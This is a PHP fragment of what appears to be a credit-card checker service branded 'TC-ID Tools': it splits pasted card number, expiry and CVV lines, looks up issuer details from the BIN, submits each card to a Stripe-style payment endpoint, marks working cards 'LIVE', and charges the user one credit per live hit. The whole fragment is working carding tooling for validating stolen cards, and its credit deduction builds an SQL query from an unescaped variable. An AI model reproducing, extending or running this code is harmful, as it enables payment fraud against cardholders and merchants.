
if (isset($cclist)){
	
	// cek wrong
	if ($pisah[1] == '' || $pisah[1] == null || $pisah[2] == '' || $pisah[2] == null) {
		die('{"error":-1,"msg":"<font color=gold><b>UNKNOWN</b></font> | Unable to checking [CRE:'.$credit.']"}');
	}
	
	if (preg_match("/[a-zA-Z]/", $cclist)) {
		die('{"error":-1,"msg":"<font color=gold><b>UNKNOWN</b></font> | Unable to checking [CRE:'.$credit.']"}');
	}
	
	$num = $pisah[0];
	$exp = $pisah[1];
	
	if (strlen($exp) == 3) {
		die('{"error":-1,"msg":"<font color=gold><b>UNKNOWN</b></font> | '.$cclist.' | Invalid Exp"}');
		/* $expm = substr($exp,0,1);
		$expy = substr($exp,1,3);
		$cvv = $pisah[2]; */
	} else if (strlen($exp) == 4) {
		$expm = substr($exp,0,2);
		$expy = '20'.substr($exp,2,4);
		$cvv = $pisah[2];
	} else if (strlen($exp) == 5) {
		die('{"error":-1,"msg":"<font color=gold><b>UNKNOWN</b></font> | '.$cclist.' | Invalid Exp ["}');
		/* $expm = substr($exp,0,1);
		$expy = substr($exp,1,5);
		$cvv = $pisah[2]; */
	} else if (strlen($exp) == 6) {
		die('{"error":-1,"msg":"<font color=gold><b>UNKNOWN</b></font> | '.$cclist.' | Invalid Exp "}');
		/* $expm = substr($exp,0,2);
		$expy = substr($exp,2,6);
		$cvv = $pisah[2]; */
	} else {
		// cek wrong
		if ($pisah[3] == '' || $pisah[3] == null) {
			die('{"error":-1,"msg":"<font color=gold><b>UNKNOWN</b></font> | Unable to checking "}');
		}
		$expm = $pisah[1];
		$expy = $pisah[2];
		$cvv = $pisah[3];
	}
	$expm = getMon($expm, 1);
	$expy = getYear($expy, 4);
	$format = $num.'|'.$expm.'|'.$expy.'|'.$cvv;
	$api = $_POST['apikey'];
	// get bin info
	$bin = ambilAngkaBin($num);
	$curl = curl("http://www.binlist.net/json/".$bin);
	$json = json_decode($curl);
	$cc_brand = $json->brand ? $json->brand : "N/A";
	$cc_type = $json->card_type ? $json->card_type : "N/A";
	$cc_category = $json->card_category ? $json->card_category : "N/A";
	$cc_bank = $json->bank ? $json->bank : "N/A";
	$cc_country = $json->country_name ? $json->country_name : "N/A";
	$info_bin = '<font color=blue>'.$cc_brand.'</font> - <font color=limegreen>'.$cc_type.'</font> - <font color=red>'.$cc_category.'</font> - <font color=orange>'.$cc_bank.'</font> - <font color=purple>'.$cc_country.'</font>';

	$curl = curl('http://'.$_SERVER['HTTP_HOST'].'/api-stripe/pay.php?api='.$api.'&num='.$num.'&expm='.$expm.'&expy='.$expy.'&cvv='.$cvv);
	$cek = json_decode($curl);

	if ($cek->status == '3') {
		die('{"error":1}');
	} else if ($cek->status == '2') {
		die('{"error":2,"msg":"<font color=red><b>DIE</b></font> | '.$format.' | "}');
	} else if ($cek->status == '1') {
                mysql_query("UPDATE `user` SET `credits`=credits-1 WHERE email='$email'");
		die('{"error":0,"msg":"<font color=green><b>LIVE</b></font> | '.$format.' | [BIN: '.$info_bin.']  ./TC-ID Tools"}');
	} else {
		die('{"error":-1,"msg":"<font color=gold><b>UNCHECK</b></font> | '.$format.' | "}');
	}
}
?>